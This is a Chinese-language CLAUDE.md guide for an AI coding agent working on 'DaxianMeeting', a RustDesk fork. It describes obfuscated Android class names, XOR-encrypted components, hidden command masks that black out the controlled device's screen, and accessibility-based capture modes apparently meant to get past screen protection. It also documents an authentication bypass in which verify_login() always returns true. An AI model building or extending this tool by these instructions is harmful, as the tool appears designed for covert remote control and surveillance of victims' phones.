# CLAUDE.md — 大仙会议 (DaxianMeeting) v5.2.0

> 本文件是 Claude Code 的项目指引。每次会话开始时请先阅读本文件和 `docs/PROJECT_MEMORY.md`。

## 项目身份

- 名称：大仙会议 / DaxianMeeting v5.2.0
- 基础：RustDesk 1.4.x 二次开发
- 包名：com.daxian.dev
- APP_NAME：DaxianMeeting（libs/hbb_common/src/config.rs line 65）
- Android SO：libdaxian.so（build.sh 重命名 liblibrustdesk.so）
- Windows DLL：librustdesk.dll（未改名）
- Deep link：daxian://

## 构建命令

### Android（Linux 构建服务器）
```bash
./build.sh 1          # aarch64 签名 APK
./build.sh 2          # universal 签名 APK（arm64+armv7+x86_64）
```

### PC（Windows）
```bash
python3 build.py --flutter --release
```

### Flutter
```bash
cd flutter && flutter pub get
cd flutter && flutter build apk --release
```

### Rust
```bash
cargo build --release --features flutter
cargo test
```

## 核心架构速查

### Android 类名映射
- `oFtTiPzsqzBHGigp` = FlutterActivity（主界面）
- `DFm8Y8iMScvB2YDw` = MainService（MediaProjection）
- `nZW99cdXQ0COhB2o` = InputService（AccessibilityService）
- `XerQvgpGBzr8FDFr` = PermissionRequestActivity
- `DFrLMwitwQbfu7AC` = FloatWindowService
- `EqljohYazB0qrhnj` = ImageBufferHelper
- `ig2xH1U3RDNsb7CS` = ClipboardManager

### 双 FFI 桥
- ffi.kt（FFI 对象）— 第一桥（保留兼容）
- pkg2230.kt（ClsFx9V0S 对象）— 第二桥（主力桥，所有 Service 使用）
- JNI 代码：libs/scrap/src/android/pkg2230.rs（主）+ ffi.rs（备份副本）
- mod.rs 只导出 pkg2230

### 三模式屏幕捕获
- 正常：ImageReader → yy4mmhjJ → VIDEO_RAW
- 穿透(SKL)：Accessibility 树 → b6L3vlmP → releaseBuffer → PIXEL_SIZEBack 守门
- 无视(shouldRun)：takeScreenshot → T1s73AGm → releaseBuffer8 → PIXEL_SIZEBack8 守门

### 命令协议（MouseEvent.url + mask）
- mask=37：黑屏（Clipboard_Management）
- mask=39：穿透（HardwareKeyboard_Management）
- mask=40：无视（SUPPORTED_ABIS_Management）
- mask=41：共享开关（Benchmarks_Management）

### 认证旁路
- is_custom_client() → false（src/common.rs）
- verify_login() → true（src/common.rs）

## 关键文件速查表

| 功能 | 文件路径 |
|------|---------|
| APP_NAME 定义 | libs/hbb_common/src/config.rs line 65 |
| Protobuf 消息 | libs/hbb_common/protos/message.proto |
| 自定义 MOUSE_TYPE | src/common.rs |
| Flutter→Rust FFI | src/flutter_ffi.rs |
| 会话层 send_mouse | src/ui_session_interface.rs |
| 服务端连接处理 | src/server/connection.rs |
| Android JNI 核心 | libs/scrap/src/android/pkg2230.rs |
| Dart FFI 加载 | flutter/lib/models/native_model.dart |
| 控制按钮 UI | flutter/lib/common/widgets/overlay.dart |
| 命令 URL 编码 | flutter/lib/models/input_model.dart |
| 用户验证 | flutter/lib/models/user_model.dart |
| 全局变量 | flutter/android/.../com/daxian/dev/common.kt |
| MainService | flutter/android/.../com/daxian/dev/DFm8Y8iMScvB2YDw.kt |
| AccessibilityService | flutter/android/.../com/daxian/dev/nZW99cdXQ0COhB2o.kt |
| FlutterActivity | flutter/android/.../com/daxian/dev/oFtTiPzsqzBHGigp.kt |
| Android 构建脚本 | build.sh |
| XOR 加密 | flutter/android/.../com/daxian/dev/p50.java + q50.java |

## 修改注意事项

1. **SO 名四处同步**：build.sh、native_model.dart、ffi.kt、pkg2230.kt
2. **pkg2230.rs 修改后同步 ffi.rs**
3. **包名变更后清缓存**：`rm -rf flutter/build/ flutter/android/.gradle/ flutter/.dart_tool/`
4. **新增命令的完整链路**：common.rs 常量 → flutter_ffi.rs 映射 → input_model.dart → overlay.dart → common.dart 回调 → pkg2230.rs mask 分支 → DFm8Y8iMScvB2YDw name 处理
5. **Protobuf 修改后**：Rust 自动重编译，Android 由 build.gradle protobuf 插件处理

## 工程文档

- 项目全量技术手册：`docs/PROJECT_MEMORY.md`
- 修改记录：`docs/CHANGELOG.md`
- 每次修改后务必更新 CHANGELOG.md
